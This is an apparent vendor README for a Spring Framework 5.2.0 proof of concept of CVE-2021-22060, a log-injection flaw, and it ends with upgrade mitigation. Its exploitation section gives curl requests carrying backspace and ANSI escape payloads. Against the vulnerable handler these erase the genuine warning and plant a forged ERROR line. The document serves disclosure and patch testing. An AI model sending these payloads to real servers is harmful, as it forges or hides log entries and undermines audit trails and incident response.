# CVE‑2021‑22060 Proof of Concept (Spring 5.2.0.RELEASE)
5.2.0.RELEASE - 5.2.0.RELEASE-tuxcare.1
## Overview


CVE‑2021‑22060 is a follow‑up to CVE‑2021‑22096.  The initial fix in Spring
Framework 5.2.18 removed some control characters at the beginning of paths but
did not neutralise backspace and ANSI escape sequences.  Consequently
Spring Framework 5.2.0–5.2.18 still logs these characters verbatim when
`ResourceHttpRequestHandler` warns about a path containing `../`【913263586918717†L135-L173】.
This PoC demonstrates how attackers can forge or hide log entries using
backspace (`%08`) and escape sequences in Spring 5.2.0.

## Contents

- **`pom.xml`** – Configures Spring Boot 2.2.0 and forces Spring Framework 5.2.0.
- **`src/main/java/org/cloudlinux/example/Example.java`** – Main class
  providing a `/hello` endpoint.  The default static resource handler
  triggers the vulnerable logging code.
- **`README.md`** – This file.

## Building and running

1. **Prerequisites:** JDK 8 and Apache Maven 3.6+
2. **Build and start:**

   ```bash
   mvn clean package
   mvn spring-boot:run
   ```

   or use the JAR:

   ```bash
   mvn clean package
   java -jar target/spring-cve-2021-22060-poc-5.2.0-1.0-SNAPSHOT.jar
   ```

3. **Verify:** Navigate to `http://localhost:8080/hello` to confirm the
   application is running.

## Exploiting CVE‑2021‑22060

To trigger the vulnerable log message, include `../` in the path.  The handler
logs the original path without escaping.  Unlike CVE‑2021‑22096, this attack
does not rely on newlines: control characters such as backspace (`%08`) or
ANSI escape sequences (`ESC`) are interpreted by the terminal and can alter
the log output【913263586918717†L135-L173】.

### Backspace manipulation

Backspace (`%08`) moves the cursor backwards and deletes characters.
Requesting a path with `%08` after some text erases the preceding characters
in the log:

```bash
curl -v \
  "http://localhost:8080/api/path../data12345%08%08"
```

The log entry printed by `ResourceHttpRequestHandler` will show
`[api/path../data123]5`, indicating that the two backspaces removed the
characters `4` and `5`【913263586918717†L135-L144】.  Attackers can use this
technique to forge arbitrary path names.

### ANSI escape sequence manipulation

ANSI escape sequences begin with ESC (`%1B`) and can instruct terminals to
clear parts of the screen or delete lines.  For example, `%1B%5B1M` is
`ESC [ 1M`, which deletes one line of output【913263586918717†L150-L173】.

```bash
curl -v \
  "http://localhost:8080/api/path../suffix%1B%5B1M2025-10-15%2013%3A59%3A37.932%20ERROR%20Attack%0AInjected%20log%20line"
```

When processed by Spring 5.2.0, the escape sequence causes the legitimate
warning to be removed and the attacker‑supplied `ERROR Attack` line to remain,
followed by a newline and `Injected log line`【913263586918717†L150-L173】.  More
complex CSI sequences (e.g., `%1B%5BJ` or `%1B%5B2J`) can erase larger
portions of the display.

## Mitigation

Upgrade to Spring Framework 5.2.19 or 5.3.14+.  These versions call
`LogFormatUtils.formatValue`, which escapes newline and control characters and
replaces non‑printable bytes with placeholders【381237162041425†L90-L103】.
Alternatively, configure your loggers to encode or remove control characters
from user input.